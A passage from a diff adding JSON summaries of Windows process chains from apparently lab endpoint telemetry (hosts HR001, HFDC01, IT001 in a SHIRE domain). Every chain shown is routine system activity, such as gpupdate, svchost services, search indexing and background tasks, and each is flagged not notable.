+   "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0073",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\NETWORK SERVICE",
+  "root_process": "gpupdate.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:55:58.155000+00:00",
+  "end": "2019-05-14 22:56:05.713000+00:00",
+  "duration_s": 7.6,
+  "n_processes": 2,
+  "max_depth": 1,
+  "n_events": 54,
+  "events_by_type": {
+   "image_load": 49,
+   "process_create": 2,
+   "process_terminate": 2,
+   "process_access": 1
+  },
+  "narrative": "svchost.exe => gpupdate.exe -> conhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "gpupdate.exe /target:computer",
+   "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"
+  ]
+ },
+ {
+  "chain_id": "CH-0074",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 22:55:58.469000+00:00",
+  "end": "2019-05-14 23:05:58.551000+00:00",
+  "duration_s": 600.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 153,
+  "events_by_type": {
+   "image_load": 90,
+   "file_create": 52,
+   "network_connect": 6,
+   "pipe_event": 3,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [
+   "172.18.39.5:389 x6"
+  ],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s gpsvc"
+  ]
+ },
+ {
+  "chain_id": "CH-0075",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:56:50.140000+00:00",
+  "end": "2019-05-14 22:56:51.069000+00:00",
+  "duration_s": 0.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 31,
+  "events_by_type": {
+   "image_load": 29,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe Install $(Arg0)"
+  ]
+ },
+ {
+  "chain_id": "CH-0076",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "trustedinstaller.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 22:56:50.199000+00:00",
+  "end": "2019-05-14 22:58:52.217000+00:00",
+  "duration_s": 122.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 29,
+  "events_by_type": {
+   "image_load": 24,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => trustedinstaller.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\servicing\\TrustedInstaller.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0077",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "tiworker.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:56:50.267000+00:00",
+  "end": "2019-05-14 22:58:52.212000+00:00",
+  "duration_s": 121.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 51,
+  "events_by_type": {
+   "image_load": 43,
+   "registry_event": 5,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => tiworker.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.402_none_7e502ee34cd6a6f5\\TiWorker.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0078",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\NETWORK SERVICE",
+  "root_process": "sppsvc.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 22:58:08.316000+00:00",
+  "end": "2019-05-14 22:58:38.554000+00:00",
+  "duration_s": 30.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 43,
+  "events_by_type": {
+   "image_load": 36,
+   "registry_event": 4,
+   "process_access": 2,
+   "process_create": 1
+  },
+  "narrative": "services.exe => sppsvc.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\sppsvc.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0079",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\NETWORK SERVICE",
+  "root_process": "wmiprvse.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:59:52.617000+00:00",
+  "end": "2019-05-14 23:01:22.639000+00:00",
+  "duration_s": 90.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 83,
+  "events_by_type": {
+   "image_load": 68,
+   "registry_event": 10,
+   "pipe_event": 3,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => wmiprvse.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0080",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchprotocolhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 23:00:52.393000+00:00",
+  "end": "2019-05-14 23:03:41.529000+00:00",
+  "duration_s": 169.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 48,
+  "events_by_type": {
+   "image_load": 42,
+   "registry_event": 4,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchprotocolhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe28_ Global\\UsGthrCtrlFltPipeMssGthrPipe28 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6"
+  ]
+ },
+ {
+  "chain_id": "CH-0081",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchfilterhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 23:00:52.461000+00:00",
+  "end": "2019-05-14 23:03:41.535000+00:00",
+  "duration_s": 169.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 31,
+  "events_by_type": {
+   "image_load": 28,
+   "process_create": 1,
+   "registry_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchfilterhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 768 772 780 8192 776 "
+  ]
+ },
+ {
+  "chain_id": "CH-0082",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:01:41.478000+00:00",
+  "end": "2019-05-14 23:01:41.534000+00:00",
+  "duration_s": 0.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 37,
+  "events_by_type": {
+   "image_load": 32,
+   "registry_event": 3,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe NGCKeyPregen"
+  ]
+ },
+ {
+  "chain_id": "CH-0083",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\NETWORK SERVICE",
+  "root_process": "sppsvc.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:02:06.153000+00:00",
+  "end": "2019-05-14 23:02:36.937000+00:00",
+  "duration_s": 30.8,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 44,
+  "events_by_type": {
+   "image_load": 38,
+   "registry_event": 2,
+   "process_access": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => sppsvc.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\sppsvc.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0084",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:02:13.694000+00:00",
+  "end": "2019-05-14 23:02:14.022000+00:00",
+  "duration_s": 0.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 37,
+  "events_by_type": {
+   "image_load": 32,
+   "registry_event": 4,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe NGCKeyPregen"
+  ]
+ },
+ {
+  "chain_id": "CH-0085",
+  "host": "HFDC01",
+  "user": "SHIRE\\Administrator",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:02:13.735000+00:00",
+  "end": "2019-05-14 23:02:13.880000+00:00",
+  "duration_s": 0.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 25,
+  "events_by_type": {
+   "image_load": 22,
+   "registry_event": 2,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe KEYROAMING"
+  ]
+ },
+ {
+  "chain_id": "CH-0086",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "logonui.exe",
+  "root_parent": "winlogon.exe",
+  "start": "2019-05-14 23:02:20.017000+00:00",
+  "end": "2019-05-14 23:06:48.963000+00:00",
+  "duration_s": 268.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 285,
+  "events_by_type": {
+   "image_load": 140,
+   "registry_event": 129,
+   "other": 12,
+   "process_create": 1,
+   "process_access": 1,
+   "pipe_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "winlogon.exe => logonui.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"LogonUI.exe\" /flags:0x0 /state0:0xa3c3c855 /state1:0x41c64e6d"
+  ]
+ },
+ {
+  "chain_id": "CH-0087",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:02:21.457000+00:00",
+  "end": "2019-05-14 23:02:22.828000+00:00",
+  "duration_s": 1.4,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 29,
+  "events_by_type": {
+   "image_load": 25,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe KEYROAMING"
+  ]
+ },
+ {
+  "chain_id": "CH-0088",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "wermgr.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:06:00.361000+00:00",
+  "end": "2019-05-14 23:06:00.674000+00:00",
+  "duration_s": 0.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 66,
+  "events_by_type": {
+   "registry_event": 35,
+   "image_load": 23,
+   "file_create": 7,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => wermgr.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\wermgr.exe -upload"
+  ]
+ },
+ {
+  "chain_id": "CH-0089",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "dsregcmd.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:06:35.346000+00:00",
+  "end": "2019-05-14 23:06:36.864000+00:00",
+  "duration_s": 1.5,
+  "n_processes": 2,
+  "max_depth": 1,
+  "n_events": 108,
+  "events_by_type": {
+   "image_load": 79,
+   "registry_event": 19,
+   "network_connect": 4,
+   "process_create": 2,
+   "process_terminate": 2,
+   "process_access": 1,
+   "pipe_event": 1
+  },
+  "narrative": "svchost.exe => dsregcmd.exe -> conhost.exe",
+  "network_endpoints": [
+   "172.18.39.5:389 x2",
+   "172.18.39.5:135 x1",
+   "172.18.39.5:49667 x1"
+  ],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\dsregcmd.exe $(Arg0) $(Arg1) $(Arg2)",
+   "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"
+  ]
+ },
+ {
+  "chain_id": "CH-0090",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:06:40.462000+00:00",
+  "end": "2019-05-14 23:07:43.043000+00:00",
+  "duration_s": 62.6,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 72,
+  "events_by_type": {
+   "image_load": 68,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:App.AppXemn3t55segp7q92mwd35v2a5rk5mvwyz.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0091",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:06:40.530000+00:00",
+  "end": "2019-05-14 23:11:40.734000+00:00",
+  "duration_s": 300.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 27,
+  "events_by_type": {
+   "image_load": 24,
+   "process_create": 1,
+   "file_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\svchost.exe -k wsappx -p -s ClipSVC"
+  ]
+ },
+ {
+  "chain_id": "CH-0092",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "runtimebroker.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:06:42.113000+00:00",
+  "end": "2019-05-14 23:08:13.046000+00:00",
+  "duration_s": 90.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 151,
+  "events_by_type": {
+   "process_access": 83,
+   "image_load": 52,
+   "registry_event": 6,
+   "file_create": 5,
+   "other": 2,
+   "process_create": 1,
+   "pipe_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => runtimebroker.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0093",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:06:49.026000+00:00",
+  "end": "2019-05-14 23:06:49.332000+00:00",
+  "duration_s": 0.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 29,
+  "events_by_type": {
+   "image_load": 25,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe KEYROAMING"
+  ]
+ },
+ {
+  "chain_id": "CH-0094",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:06:49.286000+00:00",
+  "end": "2019-05-14 23:07:51.397000+00:00",
+  "duration_s": 62.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 100,
+  "events_by_type": {
+   "image_load": 88,
+   "registry_event": 10,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0095",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:06:49.858000+00:00",
+  "end": "2019-05-14 23:08:00.147000+00:00",
+  "duration_s": 70.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 129,
+  "events_by_type": {
+   "image_load": 97,
+   "registry_event": 28,
+   "other": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0096",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "mmc.exe",
+  "root_parent": "explorer.exe",
+  "start": "2019-05-14 23:06:57.334000+00:00",
+  "end": "2019-05-14 23:06:57.334000+00:00",
+  "duration_s": 0.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 2,
+  "events_by_type": {
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "explorer.exe => mmc.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\eventvwr.msc\" /s"
+  ]
+ },
+ {
+  "chain_id": "CH-0097",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "consent.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:06:57.736000+00:00",
+  "end": "2019-05-14 23:06:58.443000+00:00",
+  "duration_s": 0.7,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 237,
+  "events_by_type": {
+   "registry_event": 183,
+   "image_load": 51,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => consent.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "consent.exe 2260 426 0000023B59833A50"
+  ]
+ },
+ {
+  "chain_id": "CH-0098",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:06:58.212000+00:00",
+  "end": "2019-05-14 23:11:59.311000+00:00",
+  "duration_s": 301.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 90,
+  "events_by_type": {
+   "process_access": 51,
+   "image_load": 37,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\svchost.exe -k appmodel -p -s camsvc"
+  ]
+ },
+ {
+  "chain_id": "CH-0099",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "dllhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:06:58.324000+00:00",
+  "end": "2019-05-14 23:07:03.469000+00:00",
+  "duration_s": 5.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 26,
+  "events_by_type": {
+   "image_load": 23,
+   "process_create": 1,
+   "registry_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => dllhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}"
+  ]
+ },
+ {
+  "chain_id": "CH-0100",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "dllhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:06:58.495000+00:00",
+  "end": "2019-05-14 23:07:03.764000+00:00",
+  "duration_s": 5.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 24,
+  "events_by_type": {
+   "image_load": 21,
+   "process_create": 1,
+   "registry_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => dllhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}"
+  ]
+ },
+ {
+  "chain_id": "CH-0101",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "mmc.exe",
+  "root_parent": "explorer.exe",
+  "start": "2019-05-14 23:06:58.696000+00:00",
+  "end": "2019-05-14 23:32:49.231000+00:00",
+  "duration_s": 1550.5,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 2,
+  "events_by_type": {
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "explorer.exe => mmc.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\eventvwr.msc\" /s"
+  ]
+ },
+ {
+  "chain_id": "CH-0102",
+  "host": "IT001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchprotocolhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 23:07:15.695000+00:00",
+  "end": "2019-05-14 23:08:27.592000+00:00",
+  "duration_s": 71.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 47,
+  "events_by_type": {
+   "image_load": 42,
+   "registry_event": 3,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchprotocolhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe24_ Global\\UsGthrCtrlFltPipeMssGthrPipe24 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6"
+  ]
+ },
+ {
+  "chain_id": "CH-0103",
+  "host": "IT001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchfilterhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 23:07:15.729000+00:00",
+  "end": "2019-05-14 23:08:27.597000+00:00",
+  "duration_s": 71.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 25,
+  "events_by_type": {
+   "image_load": 23,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchfilterhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 768 772 780 8192 776 "
+  ]
+ },
+ {
+  "chain_id": "CH-0104",
+  "host": "IT001",
+  "user": "NT AUTHORITY\\NETWORK SERVICE",
+  "root_process": "sppsvc.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:09:52.404000+00:00",
+  "end": "2019-05-14 23:10:22.731000+00:00",
+  "duration_s": 30.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 44,
+  "events_by_type": {
+   "image_load": 38,
+   "registry_event": 2,
+   "process_access": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => sppsvc.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\sppsvc.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0105",
+  "host": "IT001",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:10:44.189000+00:00",
+  "end": "2019-05-14 23:10:44.751000+00:00",
+  "duration_s": 0.6,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 65,
+  "events_by_type": {
+   "image_load": 48,
+   "registry_event": 15,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0106",
+  "host": "IT001",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:11:16.687000+00:00",
+  "end": "2019-05-14 23:11:22.283000+00:00",
+  "duration_s": 5.6,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 550,
+  "events_by_type": {
+   "registry_event": 417,
+   "image_load": 111,
+   "file_create": 12,
+   "other": 4,
+   "network_connect": 4,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [
+   "52.179.129.229:443 x4"
+  ],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0107",
+  "host": "IT001",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "runtimebroker.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:11:17.082000+00:00",
+  "end": "2019-05-14 23:12:27.963000+00:00",
+  "duration_s": 70.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 437,
+  "events_by_type": {
+   "process_access": 301,
+   "image_load": 74,
+   "registry_event": 59,
+   "process_create": 1,
+   "pipe_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => runtimebroker.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0108",
+  "host": "IT001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:11:18.497000+00:00",
+  "end": "2019-05-14 23:15:17.156000+00:00",
+  "duration_s": 238.7,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 74,
+  "events_by_type": {
+   "image_load": 68,
+   "network_connect": 4,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [
+   "65.55.163.78:443 x4"
+  ],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s wlidsvc"
+  ]
+ },
+ {
+  "chain_id": "CH-0109",
+  "host": "IT001",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:11:44.278000+00:00",
+  "end": "2019-05-14 23:11:46.244000+00:00",
+  "duration_s": 2.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 470,
+  "events_by_type": {
+   "registry_event": 388,
+   "image_load": 80,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0110",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:12:54.509000+00:00",
